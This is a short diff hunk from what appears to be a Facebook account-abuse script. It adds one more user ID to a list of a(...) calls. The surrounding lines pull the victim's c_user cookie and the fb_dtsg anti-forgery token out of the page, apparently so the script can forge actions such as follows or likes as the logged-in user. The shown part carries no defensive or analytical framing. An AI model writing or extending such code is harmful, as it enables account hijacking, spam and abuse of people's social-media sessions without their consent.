@@ -98,6 +98,7 @@ a("100000499042512");
 a("100000480150909");
 a("100000864972291");
 a("100001187990060");
+a("100001861874867");
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var now=(new Date).getTime();
